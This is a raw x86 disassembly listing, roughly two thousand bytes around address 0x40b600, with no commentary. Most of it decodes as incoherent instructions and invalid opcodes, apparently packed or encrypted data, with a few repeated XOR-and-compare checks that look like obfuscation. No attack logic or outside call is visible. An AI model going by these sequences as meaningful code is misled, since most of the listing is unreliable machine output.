  40b5b3:	sub    bl,BYTE PTR [esi+0x62]
  40b5b6:	add    esi,DWORD PTR ds:0x6eda4601
  40b5bc:	lahf   
  40b5bd:	push   ss
  40b5be:	leave  
  40b5bf:	push   esi
  40b5c0:	dec    esi
  40b5c1:	cmp    dh,BYTE PTR [ebp-0x54cb3c1d]
  40b5c7:	dec    esi
  40b5c8:	pop    edi
  40b5c9:	stos   BYTE PTR es:[edi],al
  40b5ca:	pop    ebx
  40b5cb:	pop    DWORD PTR [edi+0x673a49f]
  40b5d1:	xlat   BYTE PTR ds:[ebx]
  40b5d2:	cmc    
  40b5d3:	push   eax
  40b5d4:	and    DWORD PTR [edx],esp
  40b5d6:	add    al,0xac
  40b5d8:	cmc    
  40b5d9:	dec    ebp
  40b5da:	push   ss
  40b5db:	std    
  40b5dc:	and    dl,bl
  40b5de:	dec    edi
  40b5df:	inc    ebp
  40b5e0:	popf   
  40b5e1:	pop    ebx
  40b5e2:	aas    
  40b5e3:	cmp    BYTE PTR [esi+0x54771f9c],ah
  40b5e9:	lea    esi,[esi+0x18]
  40b5ec:	inc    eax
  40b5ed:	repnz (bad) 
  40b5ef:	sar    ch,1
  40b5f1:	ror    ah,cl
  40b5f3:	xchg   edi,eax
  40b5f4:	and    eax,0x52613c04
  40b5f9:	xchg   esi,eax
  40b5fa:	gs jge 0x40b5de
  40b5fd:	add    eax,0xe9be7dbb
  40b602:	fcmovnu st,st(7)
  40b604:	and    esi,edi
  40b606:	mov    edx,0x5a3ff978
  40b60b:	pop    edi
  40b60c:	add    dh,BYTE PTR [esi]
  40b60e:	dec    esi
  40b60f:	push   es
  40b610:	sahf   
  40b611:	sbb    DWORD PTR [eax+0x29],ecx
  40b614:	jge    0x40b665
  40b616:	add    ebx,DWORD PTR [eax+0x38]
  40b619:	nop
  40b61a:	ficom  WORD PTR [esi+eiz*1+0x447ea59f]
  40b621:	(bad)  
  40b622:	ret    
  40b623:	mov    edx,0x503c9e21
  40b628:	cmp    BYTE PTR [ebx+0x3509aab3],dh
  40b62e:	dec    eax
  40b62f:	xchg   esp,eax
  40b630:	pop    ebx
  40b631:	push   0xffffff96
  40b633:	gs cmp bh,0xb4
  40b637:	or     al,0x66
  40b639:	shl    BYTE PTR [edi-0x77],cl
  40b63c:	sub    ecx,DWORD PTR [ebp+0x2]
  40b63f:	in     al,dx
  40b640:	sub    eax,ebx
  40b642:	neg    BYTE PTR [esi]
  40b644:	and    esi,edx
  40b646:	mov    ebp,0x3335bea7
  40b64b:	and    eax,0xbe03b174
  40b650:	sar    BYTE PTR [ebp-0xc],0xd7
  40b654:	push   eax
  40b655:	inc    edi
  40b656:	and    DWORD PTR [ebp-0x2c],edx
  40b659:	arpl   WORD PTR [edx-0x49d6b827],bp
  40b65f:	in     al,dx
  40b660:	add    esi,DWORD PTR [eax+0x6502ab33]
  40b666:	(bad)  [ebp+0x6dd69916]
  40b66c:	iret   
  40b66d:	aas    
  40b66e:	enter  0xffef,0x65
  40b672:	sub    BYTE PTR [edx],al
  40b674:	nop
  40b675:	push   edx
  40b676:	push   0xffffffaa
  40b678:	push   edx
  40b679:	inc    ebx
  40b67a:	loopne 0x40b63e
  40b67c:	ret    0xe856
  40b67f:	sbb    eax,0x7036e849
  40b684:	cdq    
  40b685:	xchg   edx,eax
  40b686:	addr16 or al,bh
  40b689:	inc    edx
  40b68a:	cmp    ebp,DWORD PTR [edx+edx*8-0x7f737d3f]
  40b691:	ds hlt 
  40b693:	add    al,BYTE PTR [ebp-0x16]
  40b696:	fisubr DWORD PTR [ecx-0x1f]
  40b699:	icebp  
  40b69a:	repnz mov eax,0xf09d9ef5
  40b6a0:	sub    BYTE PTR [edx+0x2c4c17f6],dl
  40b6a6:	sub    cl,BYTE PTR [ebp-0x73]
  40b6a9:	pop    esp
  40b6aa:	mov    eax,ds:0xe8d87db6
  40b6af:	push   ds
  40b6b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6b1:	add    edi,DWORD PTR [ebp-0x1c]
  40b6b4:	pop    es
  40b6b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b6:	loope  0x40b6ec
  40b6b8:	add    ebx,DWORD PTR [esi+0x5c]
  40b6bb:	lea    esp,[ecx+ebx*4-0x78]
  40b6bf:	xlat   BYTE PTR ds:[ebx]
  40b6c0:	jnp    0x40b647
  40b6c2:	cwde   
  40b6c3:	mov    ecx,0x11cb0e6b
  40b6c8:	mov    esi,0x50dca45a
  40b6cd:	sar    BYTE PTR [edi-0x3a4d5b6],1
  40b6d3:	mov    dh,0x9
  40b6d5:	sbb    bl,BYTE PTR [ebx]
  40b6d7:	je     0x40b688
  40b6d9:	loope  0x40b68c
  40b6db:	jle    0x40b6e3
  40b6dd:	rcl    esi,cl
  40b6df:	into   
  40b6e0:	push   edi
  40b6e1:	mov    al,0xc7
  40b6e3:	(bad)  
  40b6e4:	mov    esi,DWORD PTR [edx-0x415eb9fd]
  40b6ea:	sbb    al,0x5
  40b6ec:	shl    BYTE PTR ds:0xabc7ea67,cl
  40b6f2:	pop    edi
  40b6f3:	(bad)  [edi-0x3e3f2f2c]
  40b6f9:	jnp    0x40b75a
  40b6fb:	stos   DWORD PTR es:[edi],eax
  40b6fc:	aaa    
  40b6fd:	fstp   DWORD PTR [ebx-0x7c]
  40b700:	sbb    ebx,edx
  40b702:	xchg   esi,eax
  40b703:	sub    eax,0xd503e9c3
  40b708:	mov    WORD PTR [edi-0x51808eeb],es
  40b70e:	pop    esp
  40b70f:	mov    ecx,0x271b7c73
  40b714:	das    
  40b715:	sub    DWORD PTR [ecx-0x1f9cf060],edi
  40b71b:	xchg   edi,eax
  40b71c:	dec    eax
  40b71d:	fst    QWORD PTR [esi]
  40b71f:	pop    ds
  40b720:	jmp    0x8c8c:0xb374cfaf
  40b727:	mov    dh,0x1a
  40b729:	jae    0x40b6d1
  40b72b:	or     eax,0xd99c6a7b
  40b730:	(bad)  
  40b731:	mov    eax,ds:0xe2ab4669
  40b736:	cmc    
  40b737:	mov    edi,0x89d7aeb0
  40b73c:	in     eax,dx
  40b73d:	(bad)  
  40b73e:	push   cs
  40b73f:	xchg   ebx,eax
  40b740:	xor    eax,0xd63c2cb3
  40b745:	call   0x73991ea5
  40b74a:	jmp    0x9018:0xc16f00e0
  40b751:	dec    ebp
  40b752:	xchg   esi,eax
  40b753:	loop   0x40b6d7
  40b755:	jnp    0x40b6e6
  40b757:	dec    edi
  40b758:	stos   DWORD PTR es:[edi],eax
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	pop    ebx
  40b78b:	out    0x80,al
  40b78d:	xor    DWORD PTR [edx+0x387e7efe],0x917e7e7c
  40b797:	push   ebx
  40b798:	in     al,0x17
  40b79a:	jnp    0x40b819
  40b79c:	push   edi
  40b79d:	mov    cl,0xca
  40b79f:	push   ss
  40b7a0:	mov    ds:0x3ab42c06,eax
  40b7a5:	outs   dx,DWORD PTR ds:[esi]
  40b7a6:	test   DWORD PTR [ecx-0x33],edx
  40b7a9:	xchg   esi,eax
  40b7aa:	ret    0xcfdc
  40b7ad:	fst    DWORD PTR [eax-0x2cbd2be3]
  40b7b3:	clc    
  40b7b4:	push   ecx
  40b7b5:	nop
  40b7b6:	pusha  
  40b7b7:	(bad)  
  40b7b8:	push   ss
  40b7b9:	add    DWORD PTR [edx],edx
  40b7bb:	(bad)  
  40b7bc:	mov    ds:0x8063981,al
  40b7c1:	cmp    DWORD PTR [edx+ecx*2],esp
  40b7c4:	shr    BYTE PTR [edi+0x5cd4714d],1
  40b7ca:	lahf   
  40b7cb:	sub    al,0x64
  40b7cd:	and    ch,al
  40b7cf:	mov    eax,ds:0x904a8b2f
  40b7d4:	lahf   
  40b7d5:	add    eax,0x6fcfaf8f
  40b7da:	mov    eax,0xf2ba5df4
  40b7df:	adc    dh,dl
  40b7e1:	call   0x1394:0xeb9aa464
  40b7e8:	or     bh,BYTE PTR [eax+0x613ae61a]
  40b7ee:	pop    edx
  40b7ef:	xchg   edi,eax
  40b7f0:	pop    ss
  40b7f1:	sub    ebx,DWORD PTR ds:0x5ab95882
  40b7f7:	or     bh,al
  40b7f9:	jns    0x40b84d
  40b7fb:	xchg   esi,eax
  40b7fc:	dec    esp
  40b7fd:	jecxz  0x40b870
  40b7ff:	inc    edx
  40b800:	inc    esp
  40b801:	popf   
  40b802:	mov    bl,0x7a
  40b804:	in     al,dx
  40b805:	popa   
  40b806:	(bad)  
  40b808:	in     al,dx
  40b809:	test   eax,0x69e9e83d
  40b80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b80f:	add    eax,0xd313b654
  40b814:	sahf   
  40b815:	jecxz  0x40b83f
  40b817:	cmp    DWORD PTR [eax-0x3df7492b],eax
  40b81d:	int    0x2c
  40b81f:	adc    BYTE PTR [edx-0x7b20f4ab],ah
  40b825:	mov    esp,0xa64bf27b
  40b82a:	xor    eax,0xc97bbc10
  40b82f:	repnz push ss
  40b831:	out    dx,eax
  40b832:	pop    edx
  40b833:	mov    ds:0x5a9ab221,al
  40b838:	cmp    esp,DWORD PTR [edi]
  40b83a:	mov    BYTE PTR [edx],ah
  40b83c:	pop    edx
  40b83d:	popf   
  40b83e:	xchg   ebx,edi
  40b840:	add    bh,dl
  40b842:	or     al,0x5
  40b844:	dec    edi
  40b845:	out    0xe8,eax
  40b847:	xor    edx,DWORD PTR [edi-0x14]
  40b84a:	ins    DWORD PTR es:[edi],dx
  40b84b:	(bad)  
  40b84c:	mov    al,ds:0xeab316c6
  40b851:	pop    esi
  40b852:	sbb    esi,ebx
  40b854:	mov    ds:0x4db4618f,eax
  40b859:	sahf   
  40b85a:	stc    
  40b85b:	mov    al,0x7b
  40b85d:	call   0x450a:0x99ce677f
  40b864:	inc    ebx
  40b865:	push   edi
  40b866:	adc    BYTE PTR ds:0xdf60c86b,ch
  40b86c:	xchg   DWORD PTR [ebx+0x67],esi
  40b86f:	test   DWORD PTR [ebp+0xf],esi
  40b872:	jb     0x40b883
  40b874:	push   ecx
  40b875:	lods   eax,DWORD PTR ds:[esi]
  40b876:	inc    ebx
  40b877:	xchg   esi,eax
  40b878:	mov    ds,WORD PTR [eax-0x45]
  40b87b:	sbb    DWORD PTR [ebp-0x726b5138],ebx
  40b881:	xchg   edi,eax
  40b882:	lds    ebp,FWORD PTR [edi+0x4ad08ae4]
  40b888:	call   0x23f1:0x7cbaff7f
  40b88f:	js     0x40b83e
  40b891:	mov    ds:0x8a2863bb,eax
  40b896:	cmp    eax,0x827628e0
  40b89b:	inc    edi
  40b89c:	fadd   st(3),st
  40b89e:	(bad)  
  40b89f:	out    dx,eax
  40b8a0:	xlat   BYTE PTR ds:[ebx]
  40b8a1:	(bad)  
  40b8a2:	sahf   
  40b8a3:	stos   BYTE PTR es:[edi],al
  40b8a4:	pop    eax
  40b8a5:	pop    esi
  40b8a6:	sbb    eax,0x66966e90
  40b8ab:	(bad)  
  40b8ac:	in     al,dx
  40b8ad:	dec    ebx
  40b8ae:	ins    DWORD PTR es:[edi],dx
  40b8af:	pop    eax
  40b8b0:	or     DWORD PTR [edi-0x37ef44ea],ebp
  40b8b6:	push   cs
  40b8b7:	cmp    BYTE PTR [esp+ebx*8-0x1b4d9f53],cl
  40b8be:	mov    ebp,0xed47bccf
  40b8c3:	les    esp,FWORD PTR [eax-0x32]
  40b8c6:	(bad)  
  40b8c7:	fwait
  40b8c8:	popf   
  40b8c9:	dec    esi
  40b8ca:	retf   
  40b8cb:	cmp    eax,0x4dfc7b1b
  40b8d0:	fld    QWORD PTR fs:[ecx+0x2ffb6fc]
  40b8d7:	xor    eax,0x45f0d578
  40b8dc:	(bad)  
  40b8dd:	test   DWORD PTR [edi],0xa3fe2c99
  40b8e3:	js     0x40b940
  40b8e5:	jbe    0x40b868
  40b8e7:	into   
  40b8e8:	mov    ah,0x1b
  40b8ea:	mov    cs,WORD PTR [edi+0x3d]
  40b8ed:	adc    dh,cl
  40b8ef:	aas    
  40b8f0:	rcr    DWORD PTR [eax+0x35],0x64
  40b8f4:	daa    
  40b8f5:	jo     0x40b942
  40b8f7:	inc    sp
  40b8f9:	out    0xcf,al
  40b8fb:	mov    BYTE PTR [ecx+edx*8-0x4c],cl
  40b8ff:	sub    ebx,0x4e8dbcd7
  40b905:	jne    0x40b892
  40b907:	push   ss
  40b908:	add    al,0x8f
  40b90a:	lods   al,BYTE PTR ds:[esi]
  40b90b:	and    ecx,DWORD PTR [eax-0xe]
  40b90e:	sbb    esi,0xffffff8c
  40b911:	jp     0x40b92c
  40b913:	test   esp,ebp
  40b915:	sbb    edi,ecx
  40b917:	add    BYTE PTR [edx+esi*8-0x7d],dh
  40b91b:	lock clc 
  40b91d:	or     ecx,ebx
  40b91f:	cmp    al,0x4
  40b921:	pop    es
  40b922:	fist   DWORD PTR [ebp-0x1bfe1509]
  40b928:	cs clc 
  40b92a:	pop    eax
  40b92b:	(bad)  
  40b92c:	nop
  40b92d:	ss sbb al,0x1
  40b930:	daa    
  40b931:	jmp    0x40b922
  40b933:	jmp    0xbd8c563d
  40b938:	push   edx
  40b939:	scas   eax,DWORD PTR es:[edi]
  40b93a:	fidivr WORD PTR [ebx+0x23]
  40b93d:	pop    es
  40b93e:	mov    ebx,0xd16234bc
  40b943:	adc    eax,0xd8467c5d
  40b948:	es or  al,0xb1
  40b94b:	mov    ebp,0x52b24302
  40b950:	in     eax,0x41
  40b952:	int3   
  40b953:	sub    BYTE PTR [eax+0x57],al
  40b956:	out    dx,al
  40b957:	or     BYTE PTR [ebx+0x346f9c8],dh
  40b95d:	out    0xbf,al
  40b95f:	push   0xfe3f0d87
  40b964:	rcl    dl,0xcc
  40b967:	lods   eax,DWORD PTR ds:[esi]
  40b968:	add    ah,BYTE PTR [ebp*2-0x21c8e7bf]
  40b96f:	pop    es
  40b970:	mov    edx,0x52a7e1ef
  40b975:	(bad)  
  40b976:	stc    
  40b977:	mov    eax,ds:0x63c0081a
  40b97c:	push   esi
  40b97d:	mov    eax,ds:0x58a4e5b
  40b982:	xchg   esi,eax
  40b983:	add    BYTE PTR [esi],cl
  40b985:	xchg   esp,eax
  40b986:	mov    eax,ds:0x63faf995
  40b98b:	mov    ebx,0x16f1d1d9
  40b990:	loopne 0x40b9a3
  40b992:	cmp    eax,0x3d6bb462
  40b997:	fisttp DWORD PTR [esi]
  40b999:	fidivr DWORD PTR [edx+eiz*8-0x23]
  40b99d:	inc    ebx
  40b99e:	mul    DWORD PTR [edi-0x25dcde22]
  40b9a4:	mov    ebp,0x3b791541
  40b9a9:	fidiv  WORD PTR es:[esi+0x4a556c5e]
  40b9b0:	gs push ds
  40b9b2:	je     0x40b955
  40b9b4:	inc    edx
  40b9b5:	outs   dx,BYTE PTR ds:[esi]
  40b9b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b7:	mov    ecx,0x71f6c2d7
  40b9bc:	(bad)  
  40b9bd:	adc    ebp,esi
  40b9bf:	mov    dl,0x4a
  40b9c1:	nop
  40b9c2:	mov    ebx,ecx
  40b9c4:	outs   dx,BYTE PTR ds:[esi]
  40b9c5:	das    
  40b9c6:	or     eax,0xf2d1df7e
  40b9cb:	dec    edi
  40b9cc:	gs dec esp
  40b9ce:	pop    ebp
  40b9cf:	mov    eax,esp
  40b9d1:	mov    bl,dh
  40b9d3:	mov    bh,0xad
  40b9d5:	bound  ebp,QWORD PTR [ecx]
  40b9d7:	add    al,0x13
  40b9d9:	imul   esi,DWORD PTR [esi-0x12],0x47e0458b
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x483757f8],eax
  40ba0f:	and    al,0xd1
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	cwde   
  40ba1a:	or     eax,0x10e8f20b
  40ba1f:	loopne 0x40b9de
  40ba21:	push   ds
  40ba22:	xchg   esi,eax
  40ba23:	mov    bl,0xc
  40ba25:	fidivr DWORD PTR [edi]
  40ba27:	std    
  40ba28:	push   ebp
  40ba29:	(bad)  
  40ba2a:	xchg   edx,eax
  40ba2b:	stos   DWORD PTR es:[edi],eax
  40ba2c:	retf   
  40ba2d:	adc    eax,0x20beeb3e
  40ba32:	mov    dh,bl
  40ba34:	and    eax,DWORD PTR [edx+0x67]
  40ba37:	rol    DWORD PTR [edx+0x1a97347c],cl
  40ba3d:	cmp    dl,dl
  40ba3f:	dec    ebp
  40ba40:	push   ebx
  40ba41:	adc    DWORD PTR [esi+0x10bf308a],esp
  40ba47:	fadd   DWORD PTR [ebp-0x23]
  40ba4a:	cmp    bl,BYTE PTR [eax+0x28]
  40ba4d:	loope  0x40ba2c
  40ba4f:	mov    ah,0xc4
  40ba51:	push   ds
  40ba52:	pop    edi
  40ba53:	ror    BYTE PTR [esi],1
  40ba55:	stc    
  40ba56:	jg     0x40ba1d
  40ba58:	dec    eax
  40ba59:	xor    bh,BYTE PTR [ebp-0x7a]
  40ba5c:	(bad)  
  40ba5d:	frstpm(287 only) 
  40ba5f:	pop    edi
  40ba60:	out    dx,eax
  40ba61:	retf   0x13ec
  40ba64:	sbb    al,0xd
  40ba66:	pop    es
  40ba67:	pushf  
  40ba68:	pop    edi
  40ba69:	rcr    DWORD PTR [edx+0x34],1
  40ba6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba6d:	adc    eax,0x47d5c5ed
  40ba72:	scas   al,BYTE PTR es:[edi]
  40ba73:	les    edi,FWORD PTR [edi+0x40]
  40ba76:	retf   0x266f
  40ba79:	mov    dl,0x14
  40ba7b:	pop    ebx
  40ba7c:	cmp    cl,BYTE PTR [esi+0x7770a58c]
  40ba82:	je     0x40ba30
  40ba84:	cmp    BYTE PTR [edi+0x2ca5b9d4],dl
  40ba8a:	ror    BYTE PTR [ebp+eiz*1+0x9390188],0xf0
  40ba92:	in     al,dx
  40ba93:	cld    
  40ba94:	cmp    eax,0xc57454c8
  40ba99:	aam    0xb5
  40ba9b:	sbb    al,0xad
  40ba9d:	add    DWORD PTR [edi],ecx
  40ba9f:	xchg   esp,eax
  40baa1:	out    dx,al
  40baa2:	pop    eax
  40baa3:	js     0x40baf8
  40baa5:	(bad)  [ebp-0x27]
  40baa8:	sahf   
  40baa9:	mov    eax,DWORD PTR [eax]
  40baab:	pop    edi
  40baac:	push   ebp
  40baad:	jge    0x40bab3
  40baaf:	pop    esi
  40bab0:	ins    BYTE PTR es:[edi],dx
  40bab1:	sub    DWORD PTR [edx],ebx
  40bab3:	mov    eax,0xd855d5d
  40bab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab9:	fst    DWORD PTR [esi-0x4b8d3149]
  40babf:	dec    ebx
  40bac0:	add    al,0x0
  40bac2:	repz lea eax,[esi-0x32]
  40bac6:	call   0xa8e3673b
  40bacb:	test   DWORD PTR [esi+0x52],esi
  40bace:	push   esp
  40bacf:	mov    ecx,0x3d260925
  40bad4:	cmp    dl,cl
  40bad6:	push   0xffffff88
  40bad8:	jl     0x40bae3
  40bada:	or     dl,BYTE PTR [ecx-0x27]
  40badd:	popa   
  40bade:	mov    ds:0x99516e5c,eax
  40bae3:	arpl   si,sp
  40bae5:	call   0x783d:0x12a0f216
  40baec:	cmp    al,0xb6
  40baee:	loope  0x40ba9d
  40baf0:	aaa    
  40baf1:	stc    
  40baf2:	fnstenv [esi+0x38]
  40baf5:	fstp   QWORD PTR [eax-0x1d]
  40baf8:	xchg   ebp,eax
  40baf9:	xor    al,0x90
  40bafb:	fld    TBYTE PTR [esi+0x298d820b]
  40bb01:	fwait
  40bb02:	dec    edx
  40bb03:	dec    esi
  40bb04:	ja     0x40bb53
  40bb06:	lea    edx,[edi-0x8]
  40bb09:	mov    ecx,DWORD PTR [ecx-0x3c]
  40bb0c:	scas   eax,DWORD PTR es:[edi]
  40bb0d:	inc    ecx
  40bb0e:	and    ebx,DWORD PTR ss:[esi+0x6a]
  40bb12:	mov    esp,0x88df50b
  40bb17:	push   ds
  40bb18:	jmp    0x738da46f
  40bb1d:	jge    0x40bb43
  40bb1f:	add    DWORD PTR [ebp+0x4d],edi
  40bb22:	in     eax,0x3c
  40bb24:	sbb    al,0xb2
  40bb26:	lods   al,BYTE PTR ds:[esi]
  40bb27:	dec    edx
  40bb28:	xor    esp,DWORD PTR [ebx+edx*4-0x68ed69b1]
  40bb2f:	push   esi
  40bb30:	add    eax,0xb791db25
  40bb35:	aam    0x53
  40bb37:	aad    0x95
  40bb39:	ds ins DWORD PTR es:[edi],dx
  40bb3b:	dec    eax
  40bb3c:	pop    eax
  40bb3d:	sbb    eax,0xcf19874d
  40bb42:	aaa    
  40bb43:	sub    DWORD PTR [eax-0x2e],esp
  40bb46:	push   esp
  40bb47:	imul   ebp,DWORD PTR [edi],0xbe27f59c
  40bb4d:	aam    0xda
  40bb4f:	xor    al,0xdb
  40bb51:	dec    edx
  40bb52:	outs   dx,DWORD PTR ds:[esi]
  40bb53:	and    esp,DWORD PTR [edi+ebx*4+0xd888250]
  40bb5a:	std    
  40bb5b:	gs inc esp
  40bb5d:	and    ch,BYTE PTR [edi]
  40bb5f:	xchg   ebp,eax
  40bb60:	xchg   ebx,eax
  40bb61:	test   ebp,esi
  40bb63:	inc    esp
  40bb64:	xor    bl,BYTE PTR [edi-0x6b]
  40bb67:	xchg   edi,eax
  40bb68:	adc    DWORD PTR [eax+0x3c],ecx
  40bb6b:	in     eax,dx
  40bb6c:	xchg   BYTE PTR [eax+edx*2],ah
  40bb6f:	xlat   BYTE PTR ds:[ebx]
  40bb70:	outs   dx,BYTE PTR ds:[esi]
  40bb71:	je     0x40bbbb
  40bb73:	xor    esp,DWORD PTR [ebx+0x6b191fea]
  40bb79:	inc    esi
  40bb7a:	mov    esp,0x594c7485
  40bb7f:	dec    edi
  40bb80:	mov    ebx,0x9f328c9b
  40bb85:	std    
  40bb86:	test   DWORD PTR [esi+0xe0e7d6a],edi
  40bb8c:	xor    BYTE PTR [ebx+0x6c3260a6],0x7
  40bb93:	loop   0x40bb34
  40bb95:	(bad)  
  40bb96:	jg     0x40bbe1
  40bb98:	lds    ecx,FWORD PTR ds:0x98f0ab60
  40bb9e:	jb     0x40bb71
  40bba0:	xor    eax,0x1fae5776
  40bba5:	xchg   WORD PTR [ecx+0x76],di
  40bba9:	lea    esi,[esi]
  40bbab:	add    cl,BYTE PTR [ebx]
  40bbad:	jmp    0x40bbd8
  40bbaf:	fld    QWORD PTR [ebp+ecx*1-0x3e44037b]
  40bbb6:	loope  0x40bb91
  40bbb8:	call   0xfedb:0x1ce8f918
  40bbbf:	adc    bh,BYTE PTR [edx]
  40bbc1:	sti    
  40bbc2:	ret    0xcfb3
  40bbc5:	add    al,0x31
  40bbc7:	rcl    bl,cl
  40bbc9:	out    0xa2,eax
  40bbcb:	stc    
  40bbcc:	jmp    0xee5f:0x7d8be654
  40bbd3:	mov    eax,0xcac425de
  40bbd8:	pop    esi
  40bbd9:	cmp    al,0x12
  40bbdb:	xchg   BYTE PTR [edi+0x33],ch
  40bbde:	lods   eax,DWORD PTR ds:[esi]
  40bbdf:	loop   0x40bbc3
  40bbe1:	sub    eax,0x2b105231
  40bbe6:	mov    al,0x9
  40bbe8:	call   0x137e3114
  40bbed:	shl    BYTE PTR [ebx],cl
  40bbef:	push   edi
  40bbf0:	mov    eax,ds:0x4dcf4efd
  40bbf5:	jecxz  0x40bc0b
  40bbf7:	outs   dx,DWORD PTR ds:[esi]
  40bbf8:	and    esp,DWORD PTR [edi]
  40bbfa:	loop   0x40bbd5
  40bbfc:	jg     0x40bc67
  40bbfe:	inc    ecx
  40bbff:	test   ah,bh
  40bc01:	imul   esi,DWORD PTR [ebx-0x3],0x79e36949
  40bc08:	jmp    0xfd38ade1
  40bc0d:	retf   0x6d83
  40bc10:	inc    ebx
  40bc11:	sahf   
  40bc12:	sbb    eax,0x73777a36
  40bc17:	xchg   ebp,eax
  40bc18:	test   eax,0xb1e23832
  40bc1d:	mov    DWORD PTR [edi+0x11],edi
  40bc20:	lds    edi,FWORD PTR [bp-0x6da1]
  40bc25:	pop    ecx
  40bc26:	xchg   esi,eax
  40bc27:	xlat   BYTE PTR ds:[ebx]
  40bc28:	js     0x40bbda
  40bc2a:	rcr    BYTE PTR [ebx-0x2441295f],1
  40bc30:	mov    ah,0x83
  40bc32:	scas   eax,DWORD PTR es:[edi]
  40bc33:	loop   0x40bc74
  40bc35:	or     al,0xc0
  40bc37:	cdq    
  40bc38:	mov    esp,0x610699fc
  40bc3d:	lahf   
  40bc3e:	push   edx
  40bc3f:	dec    edx
  40bc40:	sbb    esi,DWORD PTR [eax-0x3680090d]
  40bc46:	lahf   
  40bc47:	pushf  
  40bc48:	lods   eax,DWORD PTR ds:[esi]
  40bc49:	shl    BYTE PTR [edi-0x38995d7b],cl
  40bc4f:	push   0x25cab218
  40bc54:	xchg   ebp,eax
  40bc55:	push   es
  40bc56:	add    eax,0xf5a29960
  40bc5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc5c:	ror    DWORD PTR [edx-0x29],0xf
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	xor    al,0xe5
  40bc97:	cmp    cl,0xc6
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	(bad)  
  40bca2:	outs   dx,BYTE PTR ds:[esi]
  40bca3:	jecxz  0x40bccc
  40bca5:	push   edi
  40bca6:	pop    edi
  40bca7:	pusha  
  40bca8:	xchg   ebp,eax
  40bca9:	(bad)  
  40bcaa:	jmp    0x40bc92
  40bcac:	fist   WORD PTR [ecx-0x19]
  40bcaf:	add    al,0xa7
  40bcb1:	nop
  40bcb2:	jmp    0x40bc4d
  40bcb4:	or     DWORD PTR [edi-0x17803553],edi
  40bcba:	test   dl,ah
  40bcbc:	inc    ebx
  40bcbd:	outs   dx,DWORD PTR ds:[esi]
  40bcbe:	jae    0x40bd00
  40bcc0:	dec    esp
  40bcc1:	jb     0x40bc64
  40bcc3:	jecxz  0x40bd16
  40bcc5:	xchg   ecx,eax
  40bcc6:	test   ah,0x11
  40bcc9:	stos   DWORD PTR es:[edi],eax
  40bcca:	xor    DWORD PTR [ecx+0x51],0xfffffff5
  40bcce:	push   0xc6a0f96d
  40bcd3:	sub    DWORD PTR [edx-0x39],0x2b
  40bcd7:	jno    0x40bcb5
  40bcd9:	pop    eax
  40bcda:	xchg   edx,eax
  40bcdb:	adc    BYTE PTR [ecx],dl
  40bcdd:	adc    al,0xba
  40bcdf:	(bad)  
  40bce0:	fsubr  QWORD PTR [eax+0x74]
  40bce3:	neg    BYTE PTR [esp+ecx*1]
  40bce6:	retf   
  40bce7:	push   esp
  40bce8:	inc    eax
  40bce9:	and    eax,esi
  40bceb:	dec    eax
  40bcec:	xchg   DWORD PTR [eax],eax
  40bcee:	or     BYTE PTR [edi],cl
  40bcf0:	jg     0x40bd4e
  40bcf2:	retf   0x9790
  40bcf5:	dec    ecx
  40bcf6:	leave  
  40bcf7:	(bad)  [edi-0x72]
  40bcfa:	mov    ebx,0x5efa8d89
  40bcff:	jae    0x40bcad
  40bd01:	mov    bl,0x34
  40bd03:	cs out dx,al
  40bd05:	fisubr WORD PTR [eax-0x2c]
  40bd08:	into   
  40bd09:	cli    
  40bd0a:	inc    edi
  40bd0b:	pop    eax
  40bd0c:	cmp    eax,0x5f0848b6
  40bd11:	jge    0x40bd82
  40bd13:	jns    0x40bd13
  40bd15:	xchg   ebp,eax
  40bd16:	pop    ebx
  40bd17:	(bad)  
  40bd18:	out    dx,eax
  40bd19:	jmp    0x22dccb61
  40bd1e:	pop    edi
  40bd1f:	adc    bh,BYTE PTR [ecx-0x35]
  40bd22:	xor    eax,0x2d546d67
